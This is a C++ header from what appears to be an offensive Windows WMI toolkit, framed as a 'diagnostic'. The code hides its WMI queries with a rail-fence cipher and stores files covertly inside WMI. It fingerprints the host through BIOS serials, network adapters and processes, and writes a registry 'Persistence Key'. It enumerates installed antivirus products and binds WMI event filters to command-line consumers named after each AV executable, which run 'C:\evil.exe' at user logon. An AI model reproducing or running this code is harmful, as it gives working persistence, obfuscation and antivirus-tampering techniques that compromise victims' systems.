#pragma once
#include <iostream>
#include <phnt_windows.h>
#include <vector>
#include <phnt.h>
#include <phnt_ntdef.h>
#include <objbase.h>
#include <winreg.h>
#include <wincred.h>
#include "wmi_defs.h"
#include "ComWrapper.hpp"
#include "WMIConnection.hpp"
#include "BindingInterface.hpp"
#include "Win32Interface.hpp"
#include "RegInterface.hpp"
#include "wmicfg.hpp"
#include "QueryInterface.hpp"
#include "Cipher.hpp"
#include "ClassFactory.hpp"
#include "WMIFSInterface.hpp"
#include <codecvt>

template<class T>
T base_name(T const& path, T const& delims = L"/\\")
{
	return path.substr(path.find_last_of(delims) + 1);
}

template<class T>
T remove_extension(T const& filename)
{
	typename T::size_type const p(filename.find_last_of('.'));
	return p > 0 && p != T::npos ? filename.substr(0, p) : filename;
}

class MiniWMI {
public:
	BOOL IReady;

	MiniWMI(COMWrapper& com_wrapper, WMIConnection& wmi_connetion, Win32Interface& w32_wrapper,  
		RegInterface& stdreg_wrapper, QueryInterface& query_interface) :
		IReady(FALSE), COM(com_wrapper), WMI(wmi_connetion), IWin32(w32_wrapper), IReg(stdreg_wrapper),
		IQuery(query_interface)
	{
		if (COM.IReady && WMI.IReady && IWin32.IReady && IReg.IReady && IQuery.IReady)
			IReady = TRUE;
	}
	
	HRESULT EnumNetworkAdapters(
		_In_ std::wstring sFilter,
		_Out_	 std::vector<std::wstring>& vsSignatures
	)
	{
		Railfence ciph;
		/*
		SELECT* FROM Win32_NetworkAdapter WHERE Manufacturer LIKE "% sFilter %"
		*/

		// Declarations
		HRESULT hres = NULL;
		std::vector < std::map <std::wstring, std::any> > vOut;

		// Decipher queries
		std::wstring sQueryLikeW;
		std::wstring sQueryAllW;
		ciph.decipher(5, L"S noe tKE*Fi3wrtrEMcuIEL RW2tkp RaarL ETO _eAaWEnfe CMNdHur", sQueryLikeW);
		ciph.decipher(5, L"S noeE*Fi3wrtrL RW2tkpETO _eAaCMNd", sQueryAllW);
		
		// Execute query
		if(!sFilter.empty())
			hres = IQuery.Query(sQueryLikeW + L"\"%" + sFilter + L"%\"", vOut);
		else
			hres = IQuery.Query(sQueryAllW, vOut);

		if (FAILED(hres))
		{
			ILog("ExecQuery failed with error code 0x%08X\n", hres);
			return hres;
		}
		
		// Check the map for results
		if(!vOut.empty())
			for (auto& map : vOut)
			{
				for (auto& pair : map)
				{
					if (pair.first == L"ProductName")
					{
						// Cast to string and catch exception
						try
						{
							std::wstring sDeviceID = std::any_cast<std::wstring>(pair.second);
							ILog("ProductName: %ls\n", sDeviceID.c_str());
							vsSignatures.push_back(sDeviceID);
						}
						catch (const std::bad_any_cast& e)
						{
							ILog("Failed to cast ProductName to string: %s\n", e.what());
						}
					}
					else if (pair.first == L"servicename")
					{
						// Cast to string and catch exception
						try
						{
							std::wstring sDeviceID = std::any_cast<std::wstring>(pair.second);
							ILog("servicename: %ls\n", sDeviceID.c_str());
							vsSignatures.push_back(sDeviceID);
						}
						catch (const std::bad_any_cast& e)
						{
							ILog("Failed to cast servicename to string: %s\n", e.what());
						}
					}
				}
			}
		else
			ILog("No results found\n");
	}

	HRESULT EnumBiosSerials(
		_In_ std::wstring sFilter,
		_Out_ std::vector<std::wstring>& vsSignatures
	)
	{

		Railfence ciph;
		
		/* SELECT * FROM Win32_BIOS WHERE SerialNumber LIKE "%sFilter%" */
		// Declarations
		HRESULT hres = NULL;
		std::vector < std::map <std::wstring, std::any> > vOut;
		
		std::wstring sQueryLikeW;
		std::wstring sQueryAllW;
		
		// Decode sQueryLike and sQueryAll
		ciph.decipher(5, L"S n eb E*Fi3SWSrmeEL RW2OH iurKETO _IEEaN ICMBRlL" L"\"%" + sFilter + L"%\"", sQueryLikeW);
		ciph.decipher(5, L"S nE*Fi3SL RW2OETO _ICMB", sQueryAllW);
		
		// Execute query
		if(!sFilter.empty())
			hres = IQuery.Query(sQueryLikeW + L" \"%" + sFilter + L"%\"", vOut);
		else
			hres = IQuery.Query(sQueryAllW, vOut);
		
		if (FAILED(hres))
		{
			ILog("ExecQuery failed with error code 0x%08X\n", hres);
			return hres;
		}
		ILog("Checking results\n");
		// Check the map for results
		if (!vOut.empty())
			for (auto& map : vOut)
			{
				for (auto& pair : map)
				{
					if (pair.first == L"SerialNumber")
					{
						// Cast to string and catch exception
						try
						{
							std::wstring sDeviceID = std::any_cast<std::wstring>(pair.second);
							ILog("SerialNumber: %ls\n", sDeviceID.c_str());
							vsSignatures.push_back(sDeviceID);
						}
						catch (const std::bad_any_cast& e)
						{
							ILog("Failed to cast SerialNumber to string: %s\n", e.what());
						}
					}
					if (pair.first == L"BiosCharacteristics")
					{
						// Cast to string and catch exception
						try
						{
							std::vector<short> sCharacteristics = std::any_cast<std::vector<short>>(pair.second);
							for (auto& sChar : sCharacteristics)
							{
								ILog("BiosCharacteristics: %d\n", sChar);
							}
						}
						catch (const std::bad_any_cast& e)
						{
							// Try unsigned short
							try
							{
								std::vector<unsigned short> sCharacteristics = std::any_cast<std::vector<unsigned short>>(pair.second);
								for (auto& sChar : sCharacteristics)
								{
									ILog("BiosCharacteristics: %d\n", sChar);
								}
							}
							catch (const std::bad_any_cast& e)
							{
								ILog("Failed to cast BiosCharacteristics: %s\n", e.what());
							}
						}
					}
				}
			}
		else
			ILog("No results found\n");

		return hres;
	}
	
	// Map structure:
	// SubkeyName : < SubKeyValue : SubKeyType > 
	HRESULT EnumSubKeysAndValues(
		_In_ LONG hRootKey, 
		_In_ std::wstring sKey,
		_Out_ std::map<std::wstring, std::map<std::wstring, INT32>>& mValues)
	{
		std::map<std::wstring, INT32> mSubValues;

		IReg.EnumValue(hRootKey, sKey, mSubValues);
		HRESULT hres = NULL;
		
		if (!mSubValues.empty())
		{
			for (auto& subvalue : mSubValues)
			{
				mValues.insert(std::make_pair(subvalue.first, std::map<std::wstring, INT32>()));
				std::wstring wStringData;
				switch (subvalue.second)
				{
					case REG_SZ:
						hres = IReg.GetStringValue(hRootKey, sKey, subvalue.first, wStringData);
						if (SUCCEEDED(hres) && !wStringData.empty())
						{
							mValues[subvalue.first].insert(std::make_pair(wStringData, subvalue.second));
						}
						break;
					default:
						break;
				}

			}
		}

		return hres;
	}

	HRESULT ProcessEnumIdsByName(
		_In_ std::wstring processName,
		_Out_ std::vector<long>& processIds)
	{

		Railfence ciph;

		// Initialize vector of maps
		std::vector < std::map < std::wstring, std::any> > vProcessList;
		
		// Build query
		std::wstring sQueryFilterW;
		ciph.decipher(5, L"S neEIE*Fi3csR LKL RW2osEN EETO _r Hae CMPWm", sQueryFilterW);
		std::wstring sQuery = sQueryFilterW + L"\"%" + processName + L"%\"";
		// Execute query
		HRESULT hres;
		hres = IQuery.Query(sQuery, vProcessList);

		if (SUCCEEDED(hres))
		{
			for (auto& process : vProcessList)
			{
				for (auto& processProperty : process)
				{
					if (processProperty.first == L"ProcessId")
					{
						// Add process id to vector
						try
						{
							processIds.push_back(std::any_cast<long>(processProperty.second));
						}
						catch (std::bad_any_cast& e)
						{
							ILog("Bad any cast: %s\n", e.what());
						}
					}
				}
			}
		}

		return hres;
		
	}

	HRESULT EnumSubKeys(
		_In_ LONG hRootKey, 
		_In_ std::wstring sKey, 
		_Out_ std::vector<std::wstring>& vSubKeys)
	{
		HRESULT hres = IReg.EnumKey(hRootKey, sKey, vSubKeys);
		return hres;
	}

	HRESULT EnumRootKeys(
		_In_ LONG hRootKey,
		_Out_ std::vector<std::wstring>& vRootKeys)
	{
		HRESULT hres = IReg.EnumKey(hRootKey, L"", vRootKeys);
		return hres;
	}

private:
	COMWrapper& COM;
	WMIConnection& WMI;
	Win32Interface& IWin32;
	RegInterface& IReg;
	QueryInterface& IQuery;
};


std::map<std::wstring, HRESULT> diagnosticResults;

void AddResult(std::wstring test, HRESULT hres)
{
	if (!test.empty())
		diagnosticResults.insert(std::make_pair(test, hres));
}

int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {

	// Create event, consumer and binding 
	HRESULT hres = NULL;
	Railfence ciph;
	ClassFactory IClassFactory(ICom, WMI);
	WMIFSInterface IWMIFS(ICom, WMI, IClassFactory);
	
	// Create new root drive
	IWMIFS.CreateDrive(L"WMIFSTest", NULL);
	
	// Copy file to buffer
	std::string filePath = "C:\\GOG Games\\DOOM\\unins000.dat";
	//FILE* fh = fopen(filePath.c_str(), "rb");
	//if (fh == NULL)
	//{
	//	ILog("Failed to open file: %s\n", filePath.c_str());
	//	return 1;
	//}
	//fseek(fh, 0, SEEK_END);
	//size_t fsize = ftell(fh);
	//fseek(fh, 0, SEEK_SET);
	//unsigned char* buffer = (unsigned char*)malloc(fsize + 1);
	//fread(buffer, fsize, 1, fh);
	//fclose(fh);
	//buffer[fsize] = 0;

	//ciph.base64_encode(buffer, fsize);

	//// convert buffer to wstring
	std::wstring fileContents;
	ciph.FileToBase64UTF16(filePath, fileContents);
	

	ILog("File length is %d\n", fileContents.length());
	// Write the file
	
	try {
		hres = IWMIFS.WriteFile(L"WMIFSTest", L"NASA Ultron lives here 8-)", fileContents);
	}
	catch (std::exception& e)
	{
		ILog("Exception: %s\n", e.what());
	}

	AddResult(L"WMIFS Write File", hres);
	
	// Read the file
	std::wstring fileContentsRead;
	hres = IWMIFS.ReadFile(L"WMIFSTest", L"NASA Ultron lives here 8-)", fileContentsRead);

	AddResult(L"WMIFS Read File", hres);
	 // Compare the two
	if (std::wcscmp(fileContents.c_str(), fileContentsRead.c_str()) == 0)
	{
		ILog("File contents match\n");
	}
	else
	{
		ILog("File contents do not match\n");
	}
	
	// Print the lengths
	ILog("File wrote length: %d\n", fileContents.size() * sizeof(wchar_t));
	ILog("File read length:  %d\n", fileContentsRead.size() * sizeof(wchar_t));

	// Print number of byte difference
	if (!(fileContents.size() == fileContentsRead.size()))
	{
		AddResult(L"File Length Check", E_FAIL);
	}
	else
		AddResult(L"File Length Check", S_OK);
		
	ILog("Byte difference:   %d\n", fileContents.size() - fileContentsRead.size());
		
	// Print byte difference
	HRESULT hrIntegrityOK = S_OK;
	for (int i = 0; i < fileContents.size(); i++)
	{
		if (fileContents[i] != fileContentsRead[i])
		{
			ILog("First byte difference at index %d\n", i);
			hrIntegrityOK = E_FAIL;
			break;
		}
	}
	AddResult(L"File Integrity Check", hrIntegrityOK);
		
	// Print the last 200 bytes
	ILog("Last 20 bytes:\n");
	ILog("  File wrote:    %ls\n", fileContents.substr(fileContents.length() - 20).c_str());
	ILog("  File read:     %ls\n", fileContentsRead.substr(fileContentsRead.length() - 20).c_str());
	
	
	// Write the file
	std::string outPath = "C:\\GOG Games\\DOOM\\unins001.dat";
	ciph.Base64UTF16ToFile(fileContentsRead, outPath);

	fileContentsRead.clear();
	
	

	ILog("\n\n WMI Diagnostics --------------------------------------------- \n\n");
	Win32Interface process(ICom, WMI);

	UINT32 ProcessId = NULL;
	UINT32 ReturnValue = NULL;

	RegInterface stdReg(ICom, WMI);
	QueryInterface IQuery(ICom, WMI);
	
	MiniWMI miniWMI(ICom, WMI, process, stdReg, IQuery);
	
	std::vector<std::wstring> subKeys;

	StringTable st;
	
	ILog("Finding web browser\n");
	//SELECT * FROM Win32_Process WHERE Name LIKE "%chrome%"
	std::vector<long> processIds;
	hres = miniWMI.ProcessEnumIdsByName(L"firefox", processIds);
	if (SUCCEEDED(hres))
	{
		for (auto& processId : processIds)
		{
			ILog("Found process id: %d\n", processId);
		}
	}
	else
	{
		ILog("Failed to find process id: %d\n", hres);
	}

	ILog("Finding network adapters\n");
	
	std::vector<std::wstring> vsSignatures;
	hres = miniWMI.EnumNetworkAdapters(L"", vsSignatures);
	if (SUCCEEDED(hres))
	{
		for (auto& signature : vsSignatures)
		{
			ILog("Found signature: %ls\n", signature.c_str());
		}
	}
	else
	{
		ILog("Failed to find network adapters: %d\n", hres);
	}

	ILog("Finding BIOS serials\n");

	std::vector<std::wstring> vsSerials;
	hres = miniWMI.EnumBiosSerials(L"", vsSerials);
	if (SUCCEEDED(hres))
	{
		for (auto& serial : vsSerials)
		{
			ILog("Found serial: %ls\n", serial.c_str());
		}
	}
	else
	{
		ILog("Failed to find BIOS serials: %d\n", hres);
	}
	

	ILog("\n\n1. Creating Persistence Key ---------------------------------- \n\n");
	
	hres = stdReg.CreateKey(WMI_HIVE_LONG, st.GetRegistryKey());
	if (SUCCEEDED(hres))
	{
		hres = stdReg.SetStringValue(WMI_HIVE_LONG, st.GetRegistryKey(), st.GetRegistryValueName(), L"Test!");
		st.DestroyRegistryKey();
		st.DestroyRegistryValueName();
		if (SUCCEEDED(hres))
		{
			ILog("\n\nPASS\n");
		}
		else
		{
			ILog("\n\nFAIL\n");
		}
	}

	AddResult(L"Create Persistence Key", hres);
	
	ILog("\n\n2. Creating filter binder ------------------------------------  \n\n");
	
	RegistryBindingFast IFilterBinder(ICom, WMI);

	std::wstring sCommandLine = st.GetScript() + L"evil"; // L"powershell.exe - Command Set - ItemProperty REGISTRY::HKEY_USERS\\" + subKeys.at(0) + L"\\Software\\MyKey - Name Test - Value Test3";
	std::wstring sFilterQuery = st.GetFilterQuery();
	hres = IFilterBinder.BindRegistryFilter(
		WMI_FILTER_NAME, // Filter name
		WMI_CONSUMER_NAME, // Consumer name
		sFilterQuery,  // Filter query
		sCommandLine); // Consumer command
	
	std::wcout << "Used " << sFilterQuery << std::endl;
	std::wcout << sCommandLine << std::endl;
	st.DestroyScript();
	
	if (SUCCEEDED(hres))
	{
		ILog("PASS\n");
	}
	else
	{
		ILog("\n\nFAIL\n");
	}
    
	AddResult(L"Registry Binder", hres);

	ILog("\n\n3. Enumerating RUN keys -------------------------------------- \n\n");

	std::map<std::wstring, std::map< std::wstring, INT32>> mapValues;
	miniWMI.EnumSubKeysAndValues((LONG)HKEY_CURRENT_USER, st.GetRegistryKey(), mapValues);
	st.DestroyRegistryKey();

	for (auto& value : mapValues)
	{
		std::wcout << value.first << std::endl;
		for (auto& subvalue : value.second)
		{
			std::wcout << subvalue.first << L" : " << subvalue.second << L" ";
		}
	}
    if(!mapValues.empty())
		AddResult(L"Enumerate RUN Keys", S_OK);

	ILog("\n\n\n4. Creating TEST key ----------------------------------------- \n\n");
    hres = stdReg.CreateKey(WMI_HIVE_LONG, st.GetRegistryKey());
	st.DestroyRegistryKey();
	if (SUCCEEDED(hres))
	{
		hres = stdReg.SetStringValue(WMI_HIVE_LONG, st.GetRegistryKey(), L"Ultron", L"evil");
		st.DestroyRegistryKey();
	}
    
	if (SUCCEEDED(hres))
		ILog("\n\nPASS\n");
	else
		ILog("\n\nFAIL\n");

	AddResult(L"Create TEST Key", hres);

	ILog("\n\n5. Finding TEST key ------------------------------------------ \n\n");
	//std::vector<std::wstring> vValues;

 //   std::map<std::wstring, INT32> mValues;
 //   
	//stdReg.EnumValue(WMI_HIVE_LONG, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", mValues);
 //   
	//if (!mValues.empty())
	//{
	//	for (auto& value : mValues)
	//	{
 //           // 1 -  REG_SZ
 //           // 2 -  REG_EXPAND_SZ
	//		// 3 -  REG_BINARY
	//		// 4 -  REG_DWORD
 //           // 7 -  REG_MULTI_SZ
	//		// 11 - REG_QWORD

 //           switch (value.second)
 //           {
	//			case 1:
	//				std::wcout << L"REG_SZ: " << value.second << std::endl;
	//				break;
	//			case 2:
	//				std::wcout << L"REG_EXPAND_SZ: " << value.second << std::endl;
	//				break;
	//			case 3:
	//				std::wcout << L"REG_BINARY: " << value.second << std::endl;
	//				break;
	//			case 4:
	//				std::wcout << L"REG_DWORD: " << value.second << std::endl;
	//				break;
	//			case 7:
	//				std::wcout << L"REG_MULTI_SZ: " << value.second << std::endl;
	//				break;
	//			case 11:
	//				std::wcout << L"REG_QWORD: " << value.second << std::endl;
	//				break;
	//			default:
	//				std::wcout << L"Unknown: " << value.second << std::endl;
	//				break;
 //           }
 //           
	//	}
	//}

	std::wstring sValue;
	stdReg.GetStringValue(WMI_HIVE_LONG, st.GetRegistryKey(), st.GetRegistryValueName(), sValue);
	st.DestroyRegistryKey();
	st.DestroyRegistryValueName();
	if (!sValue.empty())
	{
		ILog("Found %ls with value: %ls\n", st.GetRegistryValueName(), sValue);
		st.DestroyRegistryValueName();
		ILog("\n\nPASS\n");
		hres = S_OK;
		
	}
	else
	{
		ILog("\n\nFAIL\n");
		hres = E_FAIL;
	}
	
	AddResult(L"Find TEST Key", hres);
	
	ILog("\n\n6. Creating notepad.exe -------------------------------------- \n\n");
	
	process.Create(L"notepad.exe", NULL, NULL, &ProcessId, &ReturnValue);

    // Print return value & process ID
	ILog("Process ID: %d\n", ProcessId);
	ILog("Return Value: %d\n", ReturnValue);

	if (!ReturnValue && ProcessId)
	{
		AddResult(L"Create Notepad", S_OK);
		ILog("\n\nPASS\n");
	}
	else
	{
		AddResult(L"Create Notepad", E_FAIL);
		ILog("\n\nFAIL\n");
	}
	
	ILog("\n\n7. Enumerating antivirus products ---------------------------- \n\n");

	AVProduct avProduct;
	std::vector<AVProduct> vAVProducts;
	
	HRESULT bAv = IQuery.QueryAntivirusProducts(vAVProducts);
    if(SUCCEEDED(bAv))
        for (auto& av : vAVProducts)
        {
			HRESULT hrsign = NULL;
			HRESULT hrreport = NULL;
            ILog("AV: %ls\n", av.displayName.c_str());
			ILog("  GUID:  %ls\n", av.instanceGuid.c_str());
			ILog("  State: %u\n", av.productState);
			std::cout << "State (hex): " << std::hex << av.productState << std::endl;
			ILog("  Path:  %ls\n", av.pathSignedExe.c_str());
            ILog("  Reporting: %ls\n", av.pathReportingExe.c_str());
            ILog("  Timestamp: %ls\n", av.timestamp.c_str());
			ILog("\n\nPASS\n");
			AddResult(L"Enumerate AV", S_OK);

			std::wstring sPathReporter = L"C:\\evil.exe " + av.pathSignedExe;
			std::wstring sPathSigner = L"C:\\evil.exe " + av.pathReportingExe;
			
			std::wstring sSignConsumerName = remove_extension(base_name(av.pathSignedExe));
			std::wstring sSignFilterName = remove_extension(base_name(av.pathSignedExe));
			
			std::wstring sReportConsumerName = remove_extension(base_name(av.pathReportingExe));
			std::wstring sReportFilterName = remove_extension(base_name(av.pathReportingExe));

			if(!sSignConsumerName.empty())
				sSignConsumerName += L"_Consumer";
			if (!sSignFilterName.empty())
				sSignFilterName += L"_Filter";
			
			if (!sReportConsumerName.empty())
				sReportConsumerName += L"_Consumer";
			if (!sReportFilterName.empty())
				sReportFilterName += L"_Filter";

			// print new paths
			std::wcout << L"Signer Consumer: " << sSignConsumerName << std::endl;
			std::wcout << L"Signer Filter: " << sSignFilterName << std::endl;
			std::wcout << L"Reporter Consumer: " << sReportConsumerName << std::endl;
			std::wcout << L"Reporter Filter: " << sReportFilterName << std::endl;
			
			
			BindingInterface IBindSign(ICom, WMI);
			BindingInterface IBindReport(ICom, WMI);

			if (IBindSign.IReady && IBindReport.IReady)
			{
				if(!sSignFilterName.empty())
					hrsign = IBindSign.CreateFilter(sSignFilterName,
						L"SELECT * FROM __InstanceCreationEvent WITHIN 0.5 WHERE TargetInstance ISA 'Win32_LoggedOnUser'",
						L"root/cimv2");
				if (!sReportFilterName.empty())
					hrreport = IBindReport.CreateFilter(sReportFilterName,
						L"SELECT * FROM __InstanceCreationEvent WITHIN 0.5 WHERE TargetInstance ISA 'Win32_LoggedOnUser'",
						L"root/cimv2");
				if (SUCCEEDED(hrsign) && SUCCEEDED(hrreport))
				{
					ILog("Created event consumer\n");
					AddResult(L"CreateEventConsumer", hres);
				}
				else
				{
					ILog("Failed to create event consumer: %llx\n", hres);
					AddResult(L"CreateEventConsumer", hres);
				}

				if (!sSignConsumerName.empty())
					hrsign = IBindSign.CreateCommandLineConsumer(sSignConsumerName, sPathSigner, L"");
				if (!sReportConsumerName.empty())
					hrreport = IBindReport.CreateCommandLineConsumer(sReportConsumerName, sPathReporter, L"");
				if (SUCCEEDED(hrsign) && SUCCEEDED(hrreport))
				{
					ILog("Created event filter\n");
					AddResult(L"CreateEventFilter", hres);
				}
				else
				{
					ILog("Failed to create event filter: %llx\n", hres);
					AddResult(L"CreateEventFilter", hres);
				}

				if (!sSignFilterName.empty() && !sSignConsumerName.empty())
					hrsign = IBindSign.BindFilterAndConsumer();
				if (!sReportFilterName.empty() && !sReportConsumerName.empty())
					hrreport = IBindReport.BindFilterAndConsumer();
				if (SUCCEEDED(hrsign) && SUCCEEDED(hrreport))
				{
					ILog("Bound event filter and consumer\n");
					AddResult(L"BindEventFilterAndConsumer", hres);
				}
				else
				{
					ILog("Failed to bind event filter and consumer: %llx\n", hres);
					AddResult(L"BindEventFilterAndConsumer", hres);
				}
			}
			else
			{
				ILog("Failed to initialize binding interface\n");
				AddResult(L"CreateEventConsumer", E_FAIL);
				AddResult(L"CreateEventFilter", E_FAIL);
				AddResult(L"BindEventFilterAndConsumer", E_FAIL);
			}
            
        }
	else
	{
		ILog("No AV found\n");
		ILog("\n\nFAIL\n");
		AddResult(L"Enumerate AV", E_FAIL);
	}




	
	ILog("\n\n-- End of diagnostic -------------------------------------- \n\n\n");
	
	// Diagnostic summary
	
	ILog("-- Diagnostic Summary --------------------------------------\n\n");
	for (auto& result : diagnosticResults)
	{
		ILog("%ls: ", result.first.c_str());
		if (result.second == S_OK)
			ILog("PASS\n");
		else
			ILog("FAIL\n");
	}
	
	ILog("\n\n");
	
    return 0;
}
